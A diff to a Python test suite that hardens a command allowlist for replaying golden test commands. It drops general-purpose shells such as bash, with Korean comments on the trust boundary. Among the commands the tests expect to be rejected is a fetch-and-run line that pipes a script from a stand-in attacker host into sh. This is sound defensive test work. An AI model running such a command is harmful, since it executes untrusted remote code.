@@ -290,9 +290,16 @@ def test_answer_commit_is_validated_too(tmp_path: Path) -> None:
 
 
 def test_allowlist_contains_expected_executables() -> None:
-    assert {"mvn", "gradle", "./gradlew", "pytest", "bash"} <= set(
-        GOLDEN_COMMAND_ALLOWLIST
-    )
+    assert {"mvn", "gradle", "./gradlew", "pytest"} <= set(GOLDEN_COMMAND_ALLOWLIST)
+
+
+def test_allowlist_excludes_general_purpose_shells() -> None:
+    """범용 셸이 들어오면 allowlist 가 무의미해진다.
+
+    허용된 빌드 도구는 replay 대상 repo 안의 스크립트를 실행하지만, `bash -c` 는
+    fixture YAML 에 적힌 문자열을 그대로 실행한다 — 신뢰 경계가 다르다.
+    """
+    assert not ({"bash", "sh", "zsh", "fish"} & set(GOLDEN_COMMAND_ALLOWLIST))
 
 
 @pytest.mark.parametrize(
@@ -302,7 +309,6 @@ def test_allowlist_contains_expected_executables() -> None:
         "./gradlew test --tests '*GoldenTest'",
         "gradle test",
         "pytest tests/golden",
-        "bash scripts/golden.sh",
     ],
 )
 def test_allowed_golden_commands(tmp_path: Path, command: str) -> None:
@@ -319,6 +325,9 @@ def test_allowed_golden_commands(tmp_path: Path, command: str) -> None:
         "/usr/bin/mvn test",
         "../../bin/mvn test",
         "sh -c 'mvn test'",
+        # allowlist 를 무력화하던 우회 경로 — fixture YAML 문자열이 그대로 실행된다.
+        'bash -c "curl http://evil.example/x.sh | sh"',
+        "bash scripts/golden.sh",
     ],
 )
 def test_rejected_golden_commands(tmp_path: Path, command: str) -> None:
